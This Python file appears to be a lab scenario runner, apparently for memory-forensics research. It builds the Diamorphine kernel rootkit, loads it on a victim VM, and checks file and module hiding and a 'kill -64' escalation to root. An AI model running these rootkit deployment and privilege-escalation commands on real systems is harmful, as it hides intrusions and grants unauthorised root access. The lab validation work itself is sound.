"""Explicit runner for the Diamorphine kernel-module scenario."""

from __future__ import annotations

from collections.abc import Callable
from pathlib import Path

import yaml
from paramiko import SSHException

from orchestrator.core import console
from orchestrator.core.provenance import file_sha256
from orchestrator.core.ssh_client import SSHClient
from scenarios.command_log import CommandLog, ScenarioClaim

SCENARIO_ID = "kernel_lkm_diamorphine"
ROOT = Path(__file__).resolve().parent
ARCHIVE = ROOT / "files/diamorphine-upstream-af494fa.tar"
BUILD_SCRIPT = ROOT / "files/build.sh"
COMPATIBILITY_PATCH = ROOT / "files/ubuntu-backport-x64-dispatch.patch"
LOCK = ROOT / "diamorphine.lock.yml"
ARTIFACT_NAME = "diamorphine.ko"

_BUILDER_ARCHIVE = "/tmp/diamorphine-upstream-af494fa.tar"
_BUILDER_BUILD_ROOT = "/tmp/diamorphine-build"
_BUILDER_SCRIPT = "/tmp/diamorphine-build.sh"
_BUILDER_PATCH = "/tmp/diamorphine-compatibility.patch"

VICTIM_ARTIFACT = f"/tmp/{ARTIFACT_NAME}"

RECON_PARENT = "/tmp"
RECON_DIRECTORY_NAME = "diamorphine_secret_dir"
RECON_NOTE_NAME = "diamorphine_secret_file.txt"
RECON_DIRECTORY = f"{RECON_PARENT}/{RECON_DIRECTORY_NAME}"
RECON_NOTE = f"{RECON_DIRECTORY}/{RECON_NOTE_NAME}"
MODULE_NAME = "diamorphine"


def get_scenario_claims() -> list[ScenarioClaim]:
    """Declare expected effects from successful scenario execution."""
    return [
        {
            "id": "reconnaissance_note_created",
            "statement": "A reconnaissance note was written and its directory and file were visible before module loading.",
            "basis": [
                "command_log.jsonl#write_recon_note",
                "command_log.jsonl#list_parent_before",
                "command_log.jsonl#list_directory_before",
                "command_log.jsonl#validate_recon_note",
            ],
            "basis_type": "successful_commands",
            "validation_limit": "The later scenario-defined access check does not establish content persistence throughout acquisition.",
        },
        {
            "id": "module_loaded",
            "statement": "insmod completed for the prepared Diamorphine module.",
            "basis": [
                "command_log.jsonl#load_module",
                "inputs/diamorphine/diamorphine.ko",
            ],
            "basis_type": "successful_execution_and_scenario_fact",
            "validation_limit": "Successful insmod does not independently establish every hook effect or continued residency at capture.",
        },
        {
            "id": "directory_hidden",
            "statement": "The reconnaissance directory disappeared from the tested parent listing after module loading.",
            "basis": [
                "command_log.jsonl#list_parent_after",
                "command_log.jsonl#validate_hiding_and_direct_access",
            ],
            "basis_type": "successful_commands",
            "validation_limit": "Limited to the tested directory listing.",
        },
        {
            "id": "file_hidden",
            "statement": "The reconnaissance file disappeared from the tested directory listing after module loading.",
            "basis": [
                "command_log.jsonl#list_directory_after",
                "command_log.jsonl#validate_hiding_and_direct_access",
            ],
            "basis_type": "successful_commands",
            "validation_limit": "Limited to the tested directory listing.",
        },
        {
            "id": "hidden_note_accessible",
            "statement": "Direct access to the hidden note returned its original contents.",
            "basis": [
                "command_log.jsonl#read_hidden_note",
                "command_log.jsonl#validate_hiding_and_direct_access",
            ],
            "basis_type": "successful_commands",
            "validation_limit": "The existing direct-access check is before acquisition and does not establish later availability.",
        },
        {
            "id": "signal_64_privilege_change",
            "statement": "The signal-64 helper changed from a non-root UID to UID 0.",
            "basis": [
                "command_log.jsonl#signal_64_helper",
                "command_log.jsonl#validate_signal_64",
            ],
            "basis_type": "successful_commands",
            "validation_limit": "The helper is short-lived; continued presence at RAM capture is not claimed.",
        },
        {
            "id": "module_hidden",
            "statement": "Diamorphine was absent from the tested lsmod output.",
            "basis": [
                "command_log.jsonl#list_modules",
                "command_log.jsonl#validate_module_hidden",
            ],
            "basis_type": "successful_commands",
            "validation_limit": "Absence from lsmod does not establish absence from other kernel views.",
        },
    ]


def build_record_is_current(record: dict, source: dict) -> bool:
    return (
        record.get("recipe", {}).get("sha256") == file_sha256(BUILD_SCRIPT)
        and record.get("source", {}).get("compatibility_patch_sha256")
        == source["compatibility_patch_sha256"]
    )


def build(ssh: SSHClient, staging: Path, source: dict) -> tuple[Path, str]:
    """Build the pinned Diamorphine module on its builder VM."""
    artifact = staging / ARTIFACT_NAME
    ssh.put(ARCHIVE, _BUILDER_ARCHIVE)
    ssh.put(BUILD_SCRIPT, _BUILDER_SCRIPT)
    ssh.put(COMPATIBILITY_PATCH, _BUILDER_PATCH)
    console.step(f"building {ARTIFACT_NAME}...")
    stdout = ssh.run_checked(
        f"bash {_BUILDER_SCRIPT} {_BUILDER_ARCHIVE} "
        f"{_BUILDER_PATCH} {_BUILDER_BUILD_ROOT}",
        timeout=1800,
    )
    ssh.get(
        f"{_BUILDER_BUILD_ROOT}/Diamorphine-{source['commit']}/{ARTIFACT_NAME}",
        artifact,
    )
    return artifact, stdout


def build_recipe() -> dict:
    """Return the exact scenario-owned build recipe recorded by the host."""
    return {"sha256": file_sha256(BUILD_SCRIPT)}


def build_target(facts: dict[str, str]) -> dict[str, str]:
    """Validate and return Diamorphine's required target facts."""
    required = ("kernel", "vermagic", "syscall_dispatch")
    missing = [key for key in required if not facts.get(key)]
    if missing:
        raise RuntimeError(
            f"builder reported no {', '.join(missing)}; build not published"
        )
    return {key: facts[key].strip() for key in required}


def run_diamorphine(
    ssh: SSHClient,
    transcript_path: Path,
    *,
    command_log_path: Path,
    artifact_path: Path,
    build_record: dict,
) -> tuple[dict, Callable[[], None]]:
    """Preflight, load Diamorphine, and validate two bounded behaviors."""
    transcript_path.touch()
    terminal = ssh.open_terminal()
    log = CommandLog(terminal, command_log_path)
    try:
        with terminal:
            console.scope("GUEST", "verify prepared module")
            guest_kernel = log.run(
                "guest_kernel", "uname -r", timeout=180
            ).combined_output.strip()
            expected_kernel = build_record["target"]["kernel"]
            if guest_kernel != expected_kernel:
                raise RuntimeError(
                    "Diamorphine module targets kernel "
                    f"{expected_kernel}, guest kernel is {guest_kernel}"
                )

            modules_disabled = log.run(
                "module_loading_policy",
                "cat /proc/sys/kernel/modules_disabled",
                timeout=180,
            ).combined_output.strip()
            if modules_disabled != "0":
                raise RuntimeError(
                    "Diamorphine requires kernel.modules_disabled=0; "
                    f"guest value is {modules_disabled!r}"
                )

            console.scope("HOST", "stage Diamorphine module")
            _upload_artifact(ssh, log, artifact_path)

            console.scope("GUEST", "prepare hidden reconnaissance note")
            log.run(
                "create_recon_directory", f"mkdir -p -- {RECON_DIRECTORY}", timeout=180
            )
            reconnaissance_note = log.run(
                "write_recon_note",
                f"recon_hostname=$(uname -n) && recon_kernel=$(uname -r) && "
                f"recon_identity=$(id) && "
                f"printf 'hostname=%s\\nkernel=%s\\nidentity=%s\\n' "
                f'"$recon_hostname" "$recon_kernel" "$recon_identity" '
                f"| tee -- {RECON_NOTE}",
                timeout=180,
            ).combined_output.strip()
            if f"kernel={guest_kernel}" not in reconnaissance_note.splitlines():
                raise RuntimeError(
                    "Reconnaissance note did not record the guest kernel"
                )
            parent_before = log.run(
                "list_parent_before", f"ls -1 -- {RECON_PARENT}", timeout=180
            ).combined_output
            directory_before = log.run(
                "list_directory_before", f"ls -1 -- {RECON_DIRECTORY}", timeout=180
            ).combined_output
            if RECON_DIRECTORY_NAME not in parent_before:
                raise RuntimeError(
                    "Reconnaissance directory was not visible before module load"
                )
            if RECON_NOTE_NAME not in directory_before:
                raise RuntimeError(
                    "Reconnaissance note was not visible before module load"
                )
            log.note("validate_recon_note")

            console.scope("GUEST", "load and validate Diamorphine")
            log.run("load_module", f"sudo -n insmod {VICTIM_ARTIFACT}", timeout=180)
            parent_after = log.run(
                "list_parent_after", f"ls -1 -- {RECON_PARENT}", timeout=180
            ).combined_output
            directory_after = log.run(
                "list_directory_after", f"ls -1 -- {RECON_DIRECTORY}", timeout=180
            ).combined_output
            direct_access = log.run(
                "read_hidden_note",
                f"cat -- {RECON_NOTE}",
                timeout=180,
            ).combined_output.strip()
            if RECON_DIRECTORY_NAME in parent_after:
                raise RuntimeError(
                    "Reconnaissance directory remained visible after module load"
                )
            if RECON_NOTE_NAME in directory_after:
                raise RuntimeError(
                    "Reconnaissance note remained visible after module load"
                )
            if direct_access != reconnaissance_note:
                raise RuntimeError(
                    "Direct access to the hidden reconnaissance note failed"
                )
            log.note("validate_hiding_and_direct_access")

            helper_output = log.run(
                "signal_64_helper",
                'bash -c \'printf "pid=%s\\n" "$$"; '
                'printf "before_uid=%s\\n" "$(id -u)"; '
                'printf "before=%s\\n" "$(id)"; '
                'builtin kill -64 "$$"; '
                'printf "after_uid=%s\\n" "$(id -u)"; '
                'printf "after=%s\\n" "$(id)"\'',
                timeout=180,
            ).combined_output
            helper = dict(
                line.split("=", 1) for line in helper_output.splitlines() if "=" in line
            )
            if not helper.get("pid", "").isdigit():
                raise RuntimeError(
                    f"Signal-64 helper PID was not captured: {helper_output!r}"
                )
            if helper.get("before_uid") in (None, "0"):
                raise RuntimeError("Signal-64 helper was not a non-root child")
            if helper.get("after_uid") != "0":
                raise RuntimeError("Signal-64 calling child did not become UID 0")
            log.note("validate_signal_64")

            lsmod = log.run("list_modules", "lsmod", timeout=180).combined_output
            if any(
                fields and fields[0] == MODULE_NAME
                for fields in (line.split() for line in lsmod.splitlines())
            ):
                raise RuntimeError("Diamorphine remained visible in lsmod")
            log.note("validate_module_hidden")
    finally:
        transcript_path.write_text(terminal.transcript, encoding="utf-8")

    return {
        "signal_64_helper_pid": int(helper["pid"]),
        "signal_64_identity_before": helper["before"],
        "signal_64_identity_after": helper["after"],
    }, lambda: None


def verify_source() -> dict:
    """Check the vendored archive against the pinned lock. Host-side, no VM."""
    lock = yaml.safe_load(LOCK.read_text(encoding="utf-8"))
    archive_hash = file_sha256(ARCHIVE)
    expected_hash = lock["retrieval"]["archive_sha256"]
    if archive_hash != expected_hash:
        raise RuntimeError(
            "Diamorphine archive SHA-256 mismatch: "
            f"expected {expected_hash}, got {archive_hash}"
        )
    patch_hash = file_sha256(COMPATIBILITY_PATCH)
    expected_patch_hash = lock["compatibility_patch"]["sha256"]
    if patch_hash != expected_patch_hash:
        raise RuntimeError(
            "Diamorphine compatibility patch SHA-256 mismatch: "
            f"expected {expected_patch_hash}, got {patch_hash}"
        )
    console.ok(f"Diamorphine source verified: {archive_hash}")
    return {
        "repository": lock["upstream"]["url"],
        "commit": lock["upstream"]["pinned_commit"],
        "archive_sha256": archive_hash,
        "compatibility_patch_sha256": patch_hash,
    }


def _upload_artifact(ssh: SSHClient, log: CommandLog, artifact_path: Path) -> None:
    console.step(f"Uploading {artifact_path.name} to {VICTIM_ARTIFACT}...")
    try:
        ssh.put(artifact_path, VICTIM_ARTIFACT)
    except (OSError, RuntimeError, SSHException) as exc:
        log.note("upload_artifact", error=str(exc))
        raise
    log.note("upload_artifact")
